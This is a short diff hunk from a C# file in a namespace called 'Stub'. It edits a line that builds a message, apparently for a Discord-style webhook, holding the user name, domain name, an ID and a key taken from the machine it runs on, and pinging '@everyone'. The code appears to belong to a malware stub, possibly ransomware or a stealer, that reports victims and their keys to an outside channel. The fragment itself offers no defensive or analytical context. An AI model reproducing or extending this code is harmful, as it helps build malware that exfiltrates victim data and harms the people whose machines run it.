@@ -61,7 +61,7 @@ namespace Stub
                 content.Add(new StringContent(avatarUrl), "avatar_url");
 
 
-                content.Add(new StringContent($"@everyone\n```Username:{Environment.UserName} / {Environment.UserDomainName}\nID:{ID}\nKey:{Key}"), "content");
+                content.Add(new StringContent($"@everyone\n```Username:{Environment.UserName} / {Environment.UserDomainName}\nID:{ID}\nKey:{Key}```"), "content");
 
 
 
